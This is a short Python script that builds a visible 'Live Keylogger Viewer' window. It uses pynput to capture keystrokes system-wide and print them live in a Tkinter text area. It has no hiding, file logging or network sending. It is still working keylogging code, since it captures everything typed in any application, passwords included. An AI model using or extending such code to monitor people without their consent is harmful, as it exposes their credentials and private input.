import pynput.keyboard
import tkinter as tk
from tkinter import scrolledtext

class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Live Keylogger Viewer")
        self.root.geometry("500x300")

        self.text_area = scrolledtext.ScrolledText(root, wrap=tk.WORD, font=("Arial", 12))
        self.text_area.pack(expand=True, fill=tk.BOTH)
        self.text_area.insert(tk.END, "Keystrokes will appear here...\n")
        self.text_area.config(state=tk.DISABLED)  # Disable editing

        self.start_keylogger()

    def start_keylogger(self):
        self.listener = pynput.keyboard.Listener(on_press=self.update_gui)
        self.listener.start()

    def update_gui(self, key):
        key = str(key).replace("'", "")
        if key == "Key.space":
            key = " "  
        elif key == "Key.enter":
            key = "\n"  
        elif key.startswith("Key"):
            key = f"[{key.replace('Key.', '')}]" 

        self.text_area.config(state=tk.NORMAL)
        self.text_area.insert(tk.END, key)
        self.text_area.config(state=tk.DISABLED)
        self.text_area.yview(tk.END)  # Auto-scroll

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerGUI(root)
    root.mainloop()

